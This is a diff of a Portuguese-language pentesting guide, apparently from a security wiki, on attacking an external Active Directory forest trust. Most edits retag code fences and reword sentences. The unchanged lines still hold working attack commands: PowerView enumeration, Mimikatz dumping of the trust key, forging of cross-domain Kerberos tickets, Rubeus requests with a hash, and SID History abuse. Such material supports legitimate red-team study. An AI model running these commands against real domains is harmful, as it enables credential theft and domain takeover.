@@ -7,7 +7,7 @@ Neste cenário, um domínio externo está confiando em você (ou ambos estão se
 ## Enumeração
 
 Primeiro de tudo, você precisa **enumerar** a **confiança**:
-```powershell
+```bash
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
 TargetName      : domain.external  --> Destination domain
@@ -56,14 +56,14 @@ IsDomain     : True
 # You may also enumerate where foreign groups and/or users have been assigned
 # local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
 ```
-Na enumeração anterior, foi descoberto que o usuário **`crossuser`** está dentro do grupo **`External Admins`**, que tem **acesso de Admin** dentro do **DC do domínio externo**.
+Na enumeração anterior, foi encontrado que o usuário **`crossuser`** está dentro do grupo **`External Admins`** que tem **acesso de Admin** dentro do **DC do domínio externo**.
 
 ## Acesso Inicial
 
 Se você **não conseguiu** encontrar nenhum acesso **especial** do seu usuário no outro domínio, você ainda pode voltar à Metodologia AD e tentar **privesc de um usuário não privilegiado** (coisas como kerberoasting, por exemplo):
 
 Você pode usar as **funções do Powerview** para **enumerar** o **outro domínio** usando o parâmetro `-Domain`, como em:
-```powershell
+```bash
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
 {{#ref}}
@@ -75,10 +75,10 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ### Login
 
 Usando um método regular com as credenciais dos usuários que têm acesso ao domínio externo, você deve ser capaz de acessar:
-```powershell
+```bash
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
-### Abuso do SID History
+### Abuso de SID History
 
 Você também pode abusar do [**SID History**](sid-history-injection.md) através de uma confiança de floresta.
 
@@ -87,11 +87,11 @@ Se um usuário for migrado **de uma floresta para outra** e **o SID Filtering n�
 > [!WARNING]
 > Como lembrete, você pode obter a chave de assinatura com
 >
-> ```powershell
+> ```bash
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-Você poderia **assinar com** a chave **confiável** um **TGT se passando** pelo usuário do domínio atual.
+Você poderia **assinar com** a chave **confiável** um **TGT impersonando** o usuário do domínio atual.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
@@ -102,7 +102,7 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### Caminho completo para se passar pelo usuário
+### Forma completa de se passar pelo usuário
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
